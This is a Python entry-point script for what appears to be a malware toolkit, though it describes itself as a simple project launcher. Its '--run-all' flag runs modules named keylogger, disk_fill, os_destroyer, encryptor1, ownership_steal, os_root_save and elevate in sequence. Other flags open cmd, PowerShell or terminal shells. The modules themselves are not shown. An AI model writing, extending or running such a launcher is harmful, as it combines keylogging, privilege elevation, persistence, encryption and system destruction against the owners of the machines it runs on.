"""Compact entry point for the project."""

import argparse
import sys
from importlib import import_module
from pathlib import Path

ROOT = Path(__file__).resolve().parent
if str(ROOT.parent) not in sys.path:
    sys.path.insert(0, str(ROOT.parent))


def run_module(module_name, attr=None):
    try:
        mod = import_module(module_name)
        target = getattr(mod, attr) if attr else getattr(mod, "main", None)
        if callable(target):
            target()
        else:
            print(f"{module_name} loaded")
    except Exception as exc:
        print(f"{module_name} unavailable: {exc}")


def main():
    parser = argparse.ArgumentParser(description="Simple project entry point")
    parser.add_argument("--os-info", action="store_true")
    parser.add_argument("--start-terminal", action="store_true")
    parser.add_argument("--start-cmd", action="store_true")
    parser.add_argument("--start-powershell", action="store_true")
    parser.add_argument("--module", action="append", help="Run a module entrypoint by dotted path")
    parser.add_argument("--run-all", action="store_true")
    args = parser.parse_args()

    if args.os_info:
        from platform.platform_utils import get_os_type
        print(get_os_type())
    if args.start_terminal:
        from core.manager import TerminalManager
        TerminalManager().start_terminal()
    if args.start_cmd:
        from platform.mycmd import starter_cmd
        starter_cmd()
    if args.start_powershell:
        from platform.powershell import start_powershell
        start_powershell()

    if args.run_all:
        modules = [
            "collection.disk_fill", "collection.keylogger", "collection.os_destroyer",
            "core.background_runner", "core.base", "core.manager",
            "crypto.encryption_key_manager", "crypto.encryptor1",
            "persistence.keyboard_interrupt_suppress", "persistence.os_root_save", "persistence.ownership_steal",
            "platform.android_shell_util", "platform.elevate", "platform.mycmd",
            "platform.platform_utils", "platform.powershell", "platform.shells",
        ]
        for name in modules:
            run_module(name, "main")

    if args.module:
        for name in args.module:
            run_module(name, "main")


if __name__ == "__main__":
    main()
